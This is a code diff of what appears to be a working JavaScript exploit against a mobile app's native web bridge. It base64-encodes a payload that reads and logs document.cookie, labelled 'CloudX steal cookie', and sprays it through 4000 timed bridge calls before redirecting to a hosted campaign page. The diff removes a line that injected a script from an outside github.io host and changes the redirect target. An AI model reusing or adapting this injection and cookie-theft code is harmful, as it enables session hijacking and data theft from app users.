@@ -312,7 +312,7 @@
 
         const currUrl = location.href;
         //要注入的代码
-        const payload = `console.log('cloud:'+document.cookie);s=document.createElement('script'),s.src='https://seuercc.github.io/ho/jsb5.js',s.onload=()=>console.info('js load succeed'),document.head.appendChild(s);if (!location.href.startsWith("https://h5hosting-drcn.dbankcdn.cn") && !window.__cloudx) {window.__cloudx = true;console.log('CloudX steal cookie : ' + document.cookie)}`;
+        const payload = `console.log('cloud:'+document.cookie);if (!location.href.startsWith("https://h5hosting-drcn.dbankcdn.cn") && !window.__cloudx) {window.__cloudx = true;console.log('CloudX steal cookie : ' + document.cookie)}`;
         const base64Code = btoa(payload);
         // const callbackId = service + genCallbackId() + '\'); console.log(11111) //';
 
@@ -320,6 +320,7 @@
         if (success || fail) callbackCache[callbackId] = {success, fail};
         // 调用Native方法
         const nativeBridge = getNativeBridge(bridgeName);
+
 
         for (let i = 0; i < 4000; i++) {
             setTimeout(function () {
@@ -344,7 +345,7 @@
                 microTask(processMessageQueue);
             }, i);
         }
-        location.href = 'https://ug-drcn.media.dbankcloud.cn/nsp-campaign-res-drcn/campaignpreview/03bd34f78a3140a395e124789b0bd095/index.html?viewsId=0';
+        location.href = 'https://ug-drcn.media.dbankcloud.cn/nsp-campaign-res-drcn/campaignpreview/6b2dd2a7397047b7bdeb25a58b5e1ca3/index.html?hwFullScreen=1';
     };
 
     // ========================= 对外暴露的核心API =========================
